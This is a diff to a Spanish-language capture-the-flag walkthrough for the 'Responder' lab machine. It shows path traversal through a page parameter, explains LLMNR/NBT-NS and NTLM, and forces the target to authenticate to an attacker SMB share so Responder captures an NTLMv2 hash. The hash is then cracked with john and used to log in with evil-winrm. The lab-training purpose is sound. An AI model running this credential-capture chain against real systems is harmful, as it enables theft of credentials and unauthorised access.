@@ -1,3 +1,5 @@
+# Responder
+
 🗹 Verificar si el host está activo:
 
 ```shell
@@ -42,20 +44,20 @@ PORT     STATE SERVICE    VERSION
 
 🗹 Cambiar el idioma de la web y comprobar que el servidor es vulnerable a un **path traversal** comprobando si podemos leer, por ejemplo, el archivo `C:\Windows\System32\drivers\etc\hosts` agregando al parámetro `page` el path  `../../windows/system32/drivers/etc/hosts`, quedando la solicitud`http://unika.htb/index.php?page=../../windows/system32/drivers/etc/hosts`.
 
-```
+<p>
 # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost
-```
+</p>
 
-> [! INFO]
-> Cuando un cliente Windows no puede resolver un nombre de un host utilizando el servicio DNS, este utilizará el protocolo de resolución de nombres de multidifusión o mejor llamado **LLMNR** (Link-Local Multicast Name Resolution) para pedir a los equipos en la red local resolver las direcciones IPv4 e inclusive bajo IPv6.
-> Si la solicitud usando **LLMNR** falla, se utilizará el protocolo **NETBIOS** (Network Basic Input/Output System) o **NBT-NS** el cual cumple el mismo objetivo que el anterior. 
+> [!NOTE]
+> Cuando un cliente Windows no puede resolver un nombre de un host utilizando el servicio DNS, este utilizará el protocolo de resolución de nombres de multidifusión o mejor llamado **LLMNR** (Link-Local Multicast Name Resolution) para pedir a los equipos en la red local resolver las direcciones IPv4 e inclusive bajo IPv6.  
+> Si la solicitud usando **LLMNR** falla, se utilizará el protocolo **NETBIOS** (Network Basic Input/Output System) o **NBT-NS** el cual cumple el mismo objetivo que el anterior.  
 > Entonces, cuando un host utiliza **LLMNR** o **NBT-NS** para resolver una solicitud de un recurso de red, es posible que cualquier host de la red que conozca la dirección IP del host al que se le pregunte puede responder. Incluso si un host responde a una de estas solicitudes con información incorrecta, todavía se considerará como legítimo.
 
-> [! INFO]
-> NTLM es una colección de protocolos de autenticación creada por Microsoft. NT LAN Manager permite a varias computadores y servidores llevar a cabo autenticación. La mayoría de las redes intentan denegar el acceso a usuarios no autorizados, el que requiere la implementación de un proceso de autenticación.
-> El protocolo requiere a un cliente autenticarse proveyendo un nombre usuario y su correspondiente contraseña. Esto permite Esto permite establecer un intercambio entre el dispositivo del usuario y un servidor. Después de que las credenciales hayan sido reconocidas, el servidor puede chequear los permisos de acceso y permite la entrada al usuario.
+> [!NOTE]
+> NTLM es una colección de protocolos de autenticación creada por Microsoft. NT LAN Manager permite a varias computadores y servidores llevar a cabo autenticación. La mayoría de las redes intentan denegar el acceso a usuarios no autorizados, el que requiere la implementación de un proceso de autenticación.  
+> El protocolo requiere a un cliente autenticarse proveyendo un nombre usuario y su correspondiente contraseña. Esto permite Esto permite establecer un intercambio entre el dispositivo del usuario y un servidor. Después de que las credenciales hayan sido reconocidas, el servidor puede chequear los permisos de acceso y permite la entrada al usuario.  
 How does NTLM authentication work?
-> NTLM usa un protocolo **challenge-response** para chequear la autenticidad de un usuario en la red. Para hacer eso, el cliente y el host realizan los siguientes pasos:
+> NTLM usa un protocolo **challenge-response** para chequear la autenticidad de un usuario en la red. Para hacer eso, el cliente y el host realizan los siguientes pasos:  
 > 1. El cliente envía un nombre de usuario al host.
 > 1. El host responde con un número aleatorio (el **challenge**).
 > 2. El cliente entonces genera un valor de contraseña hasheado a partir del número y la contraseña del usuario, y entonces lo envía de vuelta como **response**.
@@ -138,8 +140,8 @@ sudo responder -I tun0
 [+] Listening for events...
 
 [SMB] NTLMv2-SSP Client   : 10.129.77.76
-[SMB] NTLMv2-SSP Username : RESPONDER\<SNIP>
-[SMB] NTLMv2-SSP Hash     : <SNIP>
+[SMB] NTLMv2-SSP Username : RESPONDER\<username>
+[SMB] NTLMv2-SSP Hash     : <hash>
 ```
 
 🗹 Enviar la solicitud  a la web desde el parámetro `page`, `http://unika.htb/index.php?page=//10.10.14.193/pwned`.
@@ -147,7 +149,7 @@ sudo responder -I tun0
 🗹 Guardar el hash obtenido con `responder`:
 
 ```shell
-echo 'Administrator::RESPONDER:<SNIP>' >> hash.txt
+echo '<hash>' >> hash.txt
 ```
 
 🗹 Crackear el hash con `john`:
@@ -159,13 +161,13 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-<SNIP>        (Administrator)     
+<password>        (Administrator)     
 1g 0:00:00:00 DONE (2024-03-08 23:11) 50.00g/s 204800p/s 204800c/s 204800C/s slimshady..oooooo
 Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
 Session completed. 
 ```
 
-🗹 
+🗹 Acceder al servidor mediante la herramienta `evil-winrm` proporcionando el usuario y contraseña obtenidos:
 
 ```shell
 evil-winrm -i 10.129.152.190 -u <user> -p <password>
